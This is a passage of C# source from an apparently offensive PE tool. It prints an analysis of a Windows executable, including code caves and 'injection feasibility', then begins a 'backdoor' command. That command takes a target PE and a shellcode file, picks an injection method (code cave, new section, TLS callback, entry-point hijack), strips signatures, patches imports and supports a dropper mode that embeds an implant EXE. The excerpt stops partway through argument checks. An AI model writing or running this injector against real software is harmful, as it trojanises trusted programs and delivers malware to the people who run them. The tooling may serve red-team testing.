                secContent.Add($"{FlagL(sec.HasHighEntropyVa, "High Entropy")}{FlagR(sec.HasCfg, "CFG")}");
                secContent.Add($"{FlagL(sec.HasSeh, "SEH")}{FlagR(sec.HasSafeSeh, "SafeSEH")}");
                secContent.Add($"{FlagL(sec.HasRfg, "RFG")}{FlagR(sec.HasAuthenticode, "Authenticode")}");
            }
            else
            {
                secContent.Add("[grey63]No security data available[/]");
            }

            var securityPanel = new Panel(new Markup(string.Join("\n", secContent)))
                .Header($"[bold {UiColors.Header}]Security[/]")
                .Border(BoxBorder.Rounded)
                .BorderColor(UiColors.BoxBorderColor)
                .Expand();

            AnsiConsole.Write(new Columns(overviewPanel, securityPanel));
            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  PE HEADERS
            // ══════════════════════════════════════════════════════════
            {
                var headerLines = new List<string>();

                if (result.OptionalHeader != null)
                {
                    var oh = result.OptionalHeader;
                    headerLines.Add(
                        $"[{UiColors.Accent}]Entry Point:[/] [mediumpurple1]0x{oh.AddressOfEntryPoint:X8}[/]    " +
                        $"[{UiColors.Accent}]Image Base:[/] [mediumpurple1]0x{oh.ImageBase:X}[/]    " +
                        $"[{UiColors.Accent}]Checksum:[/] [mediumpurple1]0x{oh.Checksum:X8}[/]");
                    headerLines.Add(
                        $"[{UiColors.Accent}]Section Align:[/] [mediumpurple1]0x{oh.SectionAlignment:X}[/]    " +
                        $"[{UiColors.Accent}]File Align:[/] [mediumpurple1]0x{oh.FileAlignment:X}[/]    " +
                        $"[{UiColors.Accent}]Size of Image:[/] [mediumpurple1]0x{oh.SizeOfImage:X}[/]");

                    if (oh.DllCharacteristicsList.Count > 0)
                        headerLines.Add($"[{UiColors.Accent}]DLL Chars:[/] [grey63]{Markup.Escape(string.Join(", ", oh.DllCharacteristicsList))}[/]");
                }

                if (result.FileHeader != null)
                {
                    headerLines.Add(
                        $"[{UiColors.Accent}]Machine:[/] [white]{Markup.Escape(result.FileHeader.MachineString)}[/]    " +
                        $"[{UiColors.Accent}]Timestamp:[/] [white]{result.FileHeader.TimeDateStampUtc:yyyy-MM-dd HH:mm:ss} UTC[/]");

                    if (result.FileHeader.CharacteristicsList.Count > 0)
                        headerLines.Add($"[{UiColors.Accent}]Characteristics:[/] [grey63]{Markup.Escape(string.Join(", ", result.FileHeader.CharacteristicsList))}[/]");
                }

                if (headerLines.Count > 0)
                {
                    AnsiConsole.Write(new Panel(new Markup(string.Join("\n", headerLines)))
                        .Header("[bold dodgerblue2]PE Headers[/]")
                        .Border(BoxBorder.Rounded)
                        .BorderColor(UiColors.BoxBorderColor)
                        .Expand());
                    AnsiConsole.WriteLine();
                }
            }

            // ══════════════════════════════════════════════════════════
            //  SECTIONS TABLE
            // ══════════════════════════════════════════════════════════
            {
                var sectionTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Section[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtAddr[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtSize[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RawAddr[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RawSize[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Perms[/]").Centered())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Entropy[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Bar[/]").LeftAligned());

                foreach (var sec in result.Sections)
                {
                    string entropyColor = sec.Entropy < 6.0 ? "green3_1" : sec.Entropy < 7.0 ? "gold1" : "red1";
                    string nameColor = sec.IsExecutable ? "red1" : "white";
                    string entropyBar = BuildEntropyBar(sec.Entropy);

                    sectionTable.AddRow(
                        $"[{nameColor}]{Markup.Escape(sec.Name)}[/]",
                        $"[mediumpurple1]0x{sec.VirtualAddress:X8}[/]",
                        $"[mediumpurple1]0x{sec.VirtualSize:X8}[/]",
                        $"[mediumpurple1]0x{sec.RawAddress:X8}[/]",
                        $"[mediumpurple1]0x{sec.RawSize:X8}[/]",
                        Markup.Escape(sec.PermissionsString),
                        $"[{entropyColor}]{sec.Entropy:F2}[/]",
                        entropyBar
                    );
                }

                AnsiConsole.Write(new Panel(sectionTable)
                    .Header("[bold dodgerblue2]Sections[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  SECURITY ASSESSMENT (detailed)
            // ══════════════════════════════════════════════════════════
            if (result.Security != null)
            {
                var secDetail = result.Security;

                var protTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Protection[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Status[/]").Centered())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Protection[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Status[/]").Centered());

                var allFlags = new List<(string name, bool enabled)>
                {
                    ("ASLR", secDetail.HasAslr),
                    ("DEP / NX", secDetail.HasDep),
                    ("CFG (Control Flow Guard)", secDetail.HasCfg),
                    ("High Entropy VA", secDetail.HasHighEntropyVa),
                    ("SEH", secDetail.HasSeh),
                    ("SafeSEH", secDetail.HasSafeSeh),
                    ("RFG", secDetail.HasRfg),
                    ("Force Integrity", secDetail.ForceIntegrity),
                    ("NX Compat", secDetail.NxCompat),
                    ("Authenticode", secDetail.HasAuthenticode),
                    ("AppContainer", secDetail.AppContainer),
                    ("Terminal Server Aware", secDetail.TerminalServerAware),
                };

                for (int fi = 0; fi < allFlags.Count; fi += 2)
                {
                    var left = allFlags[fi];
                    string leftIcon = left.enabled ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]";

                    if (fi + 1 < allFlags.Count)
                    {
                        var right = allFlags[fi + 1];
                        string rightIcon = right.enabled ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]";
                        protTable.AddRow(
                            $"[white]{Markup.Escape(left.name)}[/]", leftIcon,
                            $"[white]{Markup.Escape(right.name)}[/]", rightIcon);
                    }
                    else
                    {
                        protTable.AddRow(
                            $"[white]{Markup.Escape(left.name)}[/]", leftIcon,
                            "", "");
                    }
                }

                AnsiConsole.Write(new Panel(protTable)
                    .Header("[bold dodgerblue2]Security Assessment[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  IMPORTS
            // ══════════════════════════════════════════════════════════
            if (result.Imports.Count > 0)
            {
                int totalFuncs = result.TotalImports;

                var importTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]DLL[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Functions[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Delay[/]").Centered())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]DLL[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Functions[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Delay[/]").Centered());

                var importList = result.Imports.Take(20).ToList();
                for (int ii = 0; ii < importList.Count; ii += 2)
                {
                    var left = importList[ii];
                    string leftDelay = left.IsDelayLoaded ? "[gold1]Yes[/]" : "[grey63]No[/]";

                    if (ii + 1 < importList.Count)
                    {
                        var right = importList[ii + 1];
                        string rightDelay = right.IsDelayLoaded ? "[gold1]Yes[/]" : "[grey63]No[/]";
                        importTable.AddRow(
                            $"[white]{Markup.Escape(left.Name)}[/]", $"[white]{left.Functions.Count}[/]", leftDelay,
                            $"[white]{Markup.Escape(right.Name)}[/]", $"[white]{right.Functions.Count}[/]", rightDelay);
                    }
                    else
                    {
                        importTable.AddRow(
                            $"[white]{Markup.Escape(left.Name)}[/]", $"[white]{left.Functions.Count}[/]", leftDelay,
                            "", "", "");
                    }
                }

                var importContent = new List<IRenderable> { importTable };

                if (result.Imports.Count > 20)
                    importContent.Add(new Markup($"[grey63]... and {result.Imports.Count - 20} more DLLs[/]"));

                // Suspicious imports
                var suspicious = result.Imports
                    .SelectMany(d => d.Functions.Where(f => f.IsSuspicious)
                        .Select(f => new { Dll = d.Name, f.Name, f.SuspiciousReason }))
                    .ToList();

                if (suspicious.Count > 0)
                {
                    importContent.Add(new Text(""));
                    importContent.Add(new Markup($"[red1]\u26a0 Suspicious Imports ({suspicious.Count}):[/]"));

                    var suspTable = new Table()
                        .Border(TableBorder.Simple)
                        .BorderColor(Color.Red)
                        .AddColumn(new TableColumn("[red1]DLL[/]").LeftAligned())
                        .AddColumn(new TableColumn("[red1]Function[/]").LeftAligned())
                        .AddColumn(new TableColumn("[red1]Reason[/]").LeftAligned());

                    foreach (var s in suspicious)
                    {
                        suspTable.AddRow(
                            $"[gold1]{Markup.Escape(s.Dll)}[/]",
                            $"[red1]{Markup.Escape(s.Name)}[/]",
                            $"[grey63]{Markup.Escape(s.SuspiciousReason)}[/]"
                        );
                    }

                    importContent.Add(suspTable);
                }

                var importRows = new Rows(importContent);
                AnsiConsole.Write(new Panel(importRows)
                    .Header($"[bold dodgerblue2]Imports ({result.Imports.Count} DLLs, {totalFuncs} functions)[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  EXPORTS
            // ══════════════════════════════════════════════════════════
            if (result.TotalExports > 0)
            {
                var exportTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Name[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Ordinal[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RVA[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Forwarded[/]").LeftAligned());

                foreach (var exp in result.Exports)
                {
                    exportTable.AddRow(
                        $"[white]{Markup.Escape(exp.Name)}[/]",
                        $"[white]{exp.Ordinal}[/]",
                        $"[mediumpurple1]0x{exp.Rva:X8}[/]",
                        exp.IsForwarded
                            ? $"[gold1]{Markup.Escape(exp.ForwardedTo)}[/]"
                            : "[grey63]No[/]"
                    );
                }

                AnsiConsole.Write(new Panel(exportTable)
                    .Header($"[bold dodgerblue2]Exports ({result.TotalExports})[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  RESOURCES
            // ══════════════════════════════════════════════════════════
            if (result.Resources?.Count > 0)
            {
                var resContent = new List<IRenderable>();

                var resFlags = new List<string>();
                if (result.HasManifest) resFlags.Add("[green3_1]\u2713 Manifest[/]");
                if (result.HasIcon) resFlags.Add("[green3_1]\u2713 Icon[/]");
                if (result.HasVersionInfo) resFlags.Add("[green3_1]\u2713 VersionInfo[/]");
                if (resFlags.Count > 0)
                    resContent.Add(new Markup(string.Join("  ", resFlags)));

                var resTable = new Table()
                    .Border(TableBorder.Simple)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Type[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Name[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Size[/]").RightAligned());

                foreach (var res in result.Resources)
                {
                    resTable.AddRow(
                        $"[white]{Markup.Escape(res.Type)}[/]",
                        $"[white]{Markup.Escape(res.Name)}[/]",
                        $"[white]{res.Size:N0}[/]"
                    );
                }

                resContent.Add(resTable);

                AnsiConsole.Write(new Panel(new Rows(resContent))
                    .Header($"[bold dodgerblue2]Resources ({result.Resources.Count})[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  TLS
            // ══════════════════════════════════════════════════════════
            if (result.Tls != null)
            {
                var tlsLines = new List<string>();
                tlsLines.Add($"[{UiColors.Accent}]Callbacks:[/] [white]{result.Tls.NumberOfCallbacks}[/]");

                if (result.Tls.CallbackAddresses.Count > 0)
                {
                    foreach (var addr in result.Tls.CallbackAddresses)
                        tlsLines.Add($"  [mediumpurple1]0x{addr:X}[/]");
                }

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", tlsLines)))
                    .Header("[bold dodgerblue2]TLS (Thread Local Storage)[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  CODE CAVES
            // ══════════════════════════════════════════════════════════
            {
                var caveContent = new List<IRenderable>();

                if (result.TotalCodeCaves > 0)
                {
                    caveContent.Add(new Markup($"[{UiColors.Accent}]Largest:[/] [white]{result.LargestCodeCave:N0} bytes[/]"));

                    var caveTable = new Table()
                        .Border(TableBorder.Simple)
                        .BorderColor(UiColors.BoxBorderColor)
                        .AddColumn($"[{UiColors.Accent}]Section[/]")
                        .AddColumn($"[{UiColors.Accent}]Offset[/]")
                        .AddColumn($"[{UiColors.Accent}]RVA[/]")
                        .AddColumn($"[{UiColors.Accent}]Size[/]")
                        .AddColumn($"[{UiColors.Accent}]Injectable[/]");

                    foreach (var cave in result.CodeCaves.Take(10))
                    {
                        var injectIcon = cave.SuitableForInjection ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]";
                        caveTable.AddRow(
                            Markup.Escape(cave.SectionName),
                            $"[mediumpurple1]0x{cave.FileOffset:X8}[/]",
                            $"[mediumpurple1]0x{cave.VirtualAddress:X8}[/]",
                            $"[white]{cave.Size:N0} B[/]",
                            injectIcon
                        );
                    }

                    caveContent.Add(caveTable);

                    if (result.TotalCodeCaves > 10)
                        caveContent.Add(new Markup($"[grey63]... and {result.TotalCodeCaves - 10} more caves[/]"));
                }
                else
                {
                    caveContent.Add(new Markup("[grey63]No code caves found[/]"));
                }

                AnsiConsole.Write(new Panel(new Rows(caveContent))
                    .Header($"[bold dodgerblue2]Code Caves ({result.TotalCodeCaves} found, {result.TotalCodeCaveSpace:N0} bytes total)[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  PACKING / ENTROPY
            // ══════════════════════════════════════════════════════════
            {
                string overallEntropyColor = result.OverallEntropy < 6.0 ? "green3_1" : result.OverallEntropy < 7.0 ? "gold1" : "red1";
                var entropyLines = new List<string>();
                entropyLines.Add($"[{UiColors.Accent}]Overall Entropy:[/]  [{overallEntropyColor}]{result.OverallEntropy:F4}[/]  {BuildEntropyBar(result.OverallEntropy, 15)}");
                entropyLines.Add($"[{UiColors.Accent}]Possibly Packed:[/]  {(result.IsPossiblyPacked ? "[red1]Yes[/]" : "[green3_1]No[/]")}");

                if (!string.IsNullOrEmpty(result.PackerDetection))
                    entropyLines.Add($"[{UiColors.Accent}]Packer Detected:[/]  [gold1]{Markup.Escape(result.PackerDetection)}[/]");

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", entropyLines)))
                    .Header("[bold dodgerblue2]Packing / Entropy[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  INJECTION FEASIBILITY
            // ══════════════════════════════════════════════════════════
            if (result.Feasibility != null)
            {
                var feas = result.Feasibility;

                var feasLines = new List<string>();

                void AddFeasMethod(string icon, string name, MethodFeasibility m)
                {
                    string statusColor = m.Status switch
                    {
                        "Available" => "green3_1",
                        "Limited" => "gold1",
                        _ => "red1"
                    };
                    string space = m.AvailableSpace > 0 ? $"  [white]{m.AvailableSpace:N0} B[/]" : "";
                    feasLines.Add($"  {icon} [white]{name.PadRight(18)}[/] [{statusColor}]{Markup.Escape(m.Status).PadRight(12)}[/]{space}");
                }

                AddFeasMethod(feas.CodeCave.IsFeasible ? "[green3_1]\u2605[/]" : "[grey63]\u25cb[/]", "Code Cave", feas.CodeCave);
                AddFeasMethod(feas.NewSection.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "New Section", feas.NewSection);
                AddFeasMethod(feas.SectionExtension.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "Section Extension", feas.SectionExtension);
                AddFeasMethod(feas.TlsCallback.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "TLS Callback", feas.TlsCallback);
                AddFeasMethod(feas.EntryPointHijack.IsFeasible ? "[green3_1]\u2713[/]" : "[red1]\u2717[/]", "EP Hijack", feas.EntryPointHijack);

                if (!string.IsNullOrEmpty(feas.RecommendedMethod))
                {
                    feasLines.Add("");
                    feasLines.Add($"  [{UiColors.Accent}]Recommended:[/] [green3_1]{Markup.Escape(feas.RecommendedMethod)}[/]");
                }

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", feasLines)))
                    .Header("[bold dodgerblue2]Injection Feasibility[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(Color.Cyan1)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  SECTION MEMORY MAP
            // ══════════════════════════════════════════════════════════
            if (result.Sections.Count > 0)
            {
                var mapLines = new List<string>();
                long totalVirt = result.Sections.Sum(s => (long)s.VirtualSize);
                int mapBarWidth = 40;

                foreach (var s in result.Sections)
                {
                    double pct = totalVirt > 0 ? (double)s.VirtualSize / totalVirt * 100.0 : 0;
                    int filled = (int)Math.Round(pct / 100.0 * mapBarWidth);
                    filled = Math.Clamp(filled, 1, mapBarWidth);
                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : UiColors.Accent;
                    string bar = $"[{barColor}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', mapBarWidth - filled)}[/]";

                    string sizeStr = s.VirtualSize >= 1048576
                        ? $"{s.VirtualSize / 1048576.0:F1} MB"
                        : s.VirtualSize >= 1024
                        ? $"{s.VirtualSize / 1024.0:F0} KB"
                        : $"{s.VirtualSize} B";

                    mapLines.Add(
                        $"[white]{Markup.Escape(s.Name).PadRight(8)}[/]  {bar}  [white]{sizeStr,8}[/]  [grey63]{Markup.Escape(s.PermissionsString)}[/]  [grey63]{pct:F1}%[/]");
                }

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", mapLines)))
                    .Header("[bold dodgerblue2]Section Memory Map[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }

            // ══════════════════════════════════════════════════════════
            //  VIRTUAL ADDRESS SPACE
            // ══════════════════════════════════════════════════════════
            if (result.Sections.Count > 0 && result.OptionalHeader != null)
            {
                var vaLines = new List<string>();
                long totalImage = result.OptionalHeader.SizeOfImage;
                int vaBarWidth = 30;

                // PE Headers
                if (result.Sections.Count > 0)
                {
                    uint headerEnd = result.Sections[0].VirtualAddress;
                    vaLines.Add($"[mediumpurple1]0x{0:X8}[/] [grey63]\u252c\u2500\u2500[/] [dodgerblue2]PE Headers[/] [grey63]({headerEnd:N0} B)[/]");
                }

                for (int si = 0; si < result.Sections.Count; si++)
                {
                    var s = result.Sections[si];
                    double pct = totalImage > 0 ? (double)s.VirtualSize / totalImage * 100.0 : 0;
                    int filled = (int)Math.Round(pct / 100.0 * vaBarWidth);
                    filled = Math.Clamp(filled, 1, vaBarWidth);
                    string barColor = s.IsExecutable ? "red1" : s.IsWritable ? "gold1" : UiColors.Accent;
                    string bar = $"[{barColor}]{new string('\u2588', filled)}[/]";
                    string connector = si < result.Sections.Count - 1 ? "\u251c\u2500\u2500" : "\u2514\u2500\u2500";

                    string sizeStr = s.VirtualSize >= 1048576
                        ? $"{s.VirtualSize / 1048576.0:F1} MB"
                        : s.VirtualSize >= 1024
                        ? $"{s.VirtualSize / 1024.0:F0} KB"
                        : $"{s.VirtualSize} B";

                    vaLines.Add(
                        $"[mediumpurple1]0x{s.VirtualAddress:X8}[/] [grey63]{connector}[/] {bar} [white]{Markup.Escape(s.Name)}[/] [grey63]{Markup.Escape(s.PermissionsString)}  {sizeStr}[/]");
                }

                AnsiConsole.Write(new Panel(new Markup(string.Join("\n", vaLines)))
                    .Header("[bold dodgerblue2]Virtual Address Space[/]")
                    .Border(BoxBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Expand());
                AnsiConsole.WriteLine();
            }


            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Analysis failed: {ex.Message}");
            return 1;
        }
    }

    /// <summary>Build a Spectre markup usage bar.</summary>
    private static string BuildUsageBar(double pct, int width = 20)
    {
        int filled = (int)Math.Round(pct / 100.0 * width);
        filled = Math.Clamp(filled, 0, width);
        return $"[{UiColors.Accent}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', width - filled)}[/]";
    }

    /// <summary>Build a colored entropy bar (green &lt; 6, gold &lt; 7, red &gt;= 7).</summary>
    private static string BuildEntropyBar(double entropy, int width = 20)
    {
        double pct = entropy / 8.0 * 100.0;
        int filled = (int)Math.Round(pct / 100.0 * width);
        filled = Math.Clamp(filled, 0, width);
        string color = entropy < 6.0 ? "green3_1" : entropy < 7.0 ? "gold1" : "red1";
        return $"[{color}]{new string('\u2588', filled)}[/][grey23]{new string('\u2591', width - filled)}[/]";
    }


    // ═══════════════════════════════════════════════════════════════════════
    //  backdoor
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunBackdoorAsync(string[] args)
    {
        if (args.Length == 0)
        {
            if (!_isRepl) { PrintBackdoorUsage(); return 1; }
            return await RunBackdoorInteractiveSessionAsync();
        }

        string? peFile = null;
        string? shellcodeFile = null;
        string? outputFile = null;
        string method = "code-cave";
        string encryption = "none";
        string carrier = "entry-point";
        byte xorKey = 0x42;
        string sectionName = ".extra";
        bool removeSig = true;
        bool patchSubsystem = true;
        bool preserveEntry = true;
        bool patchIat = true;
        bool patchExitCalls = true;
        bool dryRun = false;
        bool verbose = false;
        bool jsonOutput = false;
        int minCaveSize = 0;
        bool? sessionLogOverride = null; // null = use AppSettings, true/false = CLI override
        string backdoorMode = "normal";
        string? implantFile = null;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-Pe" or "--pe" when i + 1 < args.Length:
                    peFile = args[++i]; break;
                case "-Shellcode" or "--shellcode" or "-s" when i + 1 < args.Length:
                    shellcodeFile = args[++i]; break;
                case "-Output" or "--output" or "-o" when i + 1 < args.Length:
                    outputFile = args[++i]; break;
                case "-Method" or "--method" or "-m" when i + 1 < args.Length:
                    method = args[++i].ToLowerInvariant(); break;
                case "-Encryption" or "--encryption" or "--enc" when i + 1 < args.Length:
                    encryption = args[++i].ToLowerInvariant(); break;
                case "-XorKey" or "--xor-key" when i + 1 < args.Length:
                    var keyStr = args[++i];
                    xorKey = keyStr.StartsWith("0x", StringComparison.OrdinalIgnoreCase)
                        ? Convert.ToByte(keyStr, 16)
                        : byte.Parse(keyStr);
                    break;
                case "-SectionName" or "--section-name" when i + 1 < args.Length:
                    sectionName = args[++i]; break;
                case "-NoRemoveSig" or "--no-remove-sig":
                    removeSig = false; break;
                case "-NoPatchSubsystem" or "--no-patch-subsystem":
                    patchSubsystem = false; break;
                case "-Carrier" or "--carrier" or "--invoke" when i + 1 < args.Length:
                    carrier = args[++i].ToLowerInvariant(); break;
                case "-NoPreserveEntry" or "--no-preserve-entry":
                    preserveEntry = false; break;
                case "-NoPatchIat" or "--no-patch-iat":
                    patchIat = false; break;
                case "-NoPatchExit" or "--no-patch-exit":
                    patchExitCalls = false; break;
                case "-CaveMinSize" or "--cave-min-size" when i + 1 < args.Length:
                    minCaveSize = int.Parse(args[++i]); break;
                case "-DryRun" or "--dry-run":
                    dryRun = true; break;
                case "-Verbose" or "--verbose":
                    verbose = true; break;
                case "-Json" or "--json":
                    jsonOutput = true; break;
                case "-NoSessionLog" or "--no-session-log":
                    sessionLogOverride = false; break;
                case "-SessionLog" or "--session-log":
                    sessionLogOverride = true; break;
                case "-Mode" or "--mode" when i + 1 < args.Length:
                    backdoorMode = args[++i].ToLowerInvariant(); break;
                case "-Implant" or "--implant" when i + 1 < args.Length:
                    implantFile = args[++i]; break;
                default:
                    if (args[i].StartsWith("-"))
                    {
                        if (IsHelpToken(args[i]))
                        {
                            PrintBackdoorUsage();
                            return 0;
                        }
                        var allBackdoorFlags = new[]
                        {
                            "-Pe", "-Shellcode", "-Output", "-Method", "-Encryption", "-XorKey",
                            "-SectionName", "-NoRemoveSig", "-NoPatchSubsystem", "-Carrier",
                            "-NoPreserveEntry", "-NoPatchIat", "-NoPatchExit", "-CaveMinSize",
                            "-DryRun", "-Verbose", "-Json", "-NoSessionLog", "-SessionLog",
                            "-Mode", "-Implant",
                        };
                        var suggestions = SuggestSimilarNames(args[i].TrimStart('-'),
                            allBackdoorFlags.Select(f => f.TrimStart('-')), 3);
                        var hint = suggestions.Count > 0
                            ? $" Did you mean: {string.Join(", ", suggestions.Select(s => "-" + s))}?"
                            : " Run 'backdoor --help' for the full flag list.";
                        WriteStatus(StatusPrefix.Failure, $"Unknown option: '{args[i]}'.{hint}");
                        return 1;
                    }
                    break;
            }
        }

        if (peFile == null || shellcodeFile == null)
        {
            var missing = new List<string>();
            if (peFile == null) missing.Add("-Pe <file>");
            if (shellcodeFile == null) missing.Add("-Shellcode <file>");
            WriteStatus(StatusPrefix.Failure,
                $"Missing required parameter(s): {string.Join(", ", missing)}. " +
                "Run 'backdoor' with no flags for the interactive session, or 'backdoor --help' for usage.");
            return 1;
        }

        if (!File.Exists(peFile))
        {
            WriteStatus(StatusPrefix.Failure, $"Target PE not found: '{peFile}'. Check the path passed to -Pe.");
            return 1;
        }
        if (!File.Exists(shellcodeFile))
        {
            WriteStatus(StatusPrefix.Failure, $"Shellcode file not found: '{shellcodeFile}'. Check the path passed to -Shellcode.");
            return 1;
        }

        var injectionMethod = method switch
        {
            "code-cave" or "codecave" or "cave" => InjectionMethod.CodeCave,
            "new-section" or "newsection" or "section" => InjectionMethod.NewSection,
            "section-ext" or "sectionext" or "extend" => InjectionMethod.SectionExtension,
            "text-pad" or "textpad" or "padding" => InjectionMethod.TextSectionPadding,
            "tls-callback" or "tls" or "tlscallback" => InjectionMethod.TlsCallback,
            null => InjectionMethod.CodeCave,
            _ => (InjectionMethod?)null
        };

        if (injectionMethod is null)
        {
            WriteStatus(StatusPrefix.Failure, $"Unknown injection method '{method}'. Expected: code-cave | new-section | section-ext | text-pad | tls-callback. Example: -Method code-cave");
            return 1;
        }

        var encryptionMethod = encryption switch
        {
            null or "none" => PayloadEncryption.None,
            "xor" => PayloadEncryption.Xor,
            "xor2" => PayloadEncryption.Xor2,
            "rc4" => PayloadEncryption.Rc4,
            _ => (PayloadEncryption?)null
        };

        if (encryptionMethod is null)
        {
            WriteStatus(StatusPrefix.Failure, $"Unknown encryption mode '{encryption}'. Expected: none. Use the encode pipeline (encoder/envelope/SGN) for payload transforms.");
            return 1;
        }

        var carrierInvoke = carrier switch
        {
            null or "entry-point" or "entrypoint" or "hijack" => CarrierInvoke.EntryPointHijack,
            "dll-main" or "dllmain" or "dll-entry"            => CarrierInvoke.EntryPointHijack,
            "function-backdoor" or "function" => CarrierInvoke.EntryFunctionBackdoor,
            "tls" or "tls-callback" => CarrierInvoke.TlsCallback,
            _ => (CarrierInvoke?)null
        };

        if (carrierInvoke is null)
        {
            WriteStatus(StatusPrefix.Failure, $"Unknown carrier '{carrier}'. Expected: entry-point | dll-main. Example: -Carrier entry-point");
            return 1;
        }

        if (encryptionMethod != PayloadEncryption.None)
        {
            AnsiConsole.MarkupLine("[red]Error:[/] The backdoor command does not perform in-place encryption or encoding.");
            AnsiConsole.MarkupLine("[grey]Prepare a compatible flat .bin first, then inject it with [white]--encryption none[/].[/]");
            return 1;
        }

        var resolvedInjection = injectionMethod.Value;

        if (carrierInvoke != CarrierInvoke.EntryPointHijack)
        {
            AnsiConsole.MarkupLine($"[red]Error:[/] Carrier [white]{Markup.Escape(carrier!)}[/] is not implemented for the backdoor command.");
            AnsiConsole.MarkupLine("[grey]Supported carriers: [white]entry-point[/] (EXE/DLL), [white]dll-main[/] (DLL — same as entry-point).[/]");
            return 1;
        }

        var resolvedCarrier = carrierInvoke.Value;
        // Determine the display label for the carrier based on what the user specified and the target type
        bool isDllCarrierAlias = carrier is "dll-main" or "dllmain" or "dll-entry";

        if (!preserveEntry)
        {
            AnsiConsole.MarkupLine("[red]Error:[/] [white]--no-preserve-entry[/] is not implemented.");
            AnsiConsole.MarkupLine("[grey]The current carrier always resumes the original entry point after launching the payload.[/]");
            return 1;
        }

        if (!BackdoorModeValues.Contains(backdoorMode))
        {
            WriteStatus(StatusPrefix.Failure, $"Unknown backdoor mode '{backdoorMode}'. Expected: normal | silence | dropper. Example: -Mode normal");
            return 1;
        }
        if (backdoorMode == "dropper" && string.IsNullOrWhiteSpace(implantFile))
        {
            WriteStatus(StatusPrefix.Failure, "Dropper mode requires -Implant <path> (the standalone implant EXE to embed). Example: -Mode dropper -Implant .\\implant.exe");
            return 1;
        }
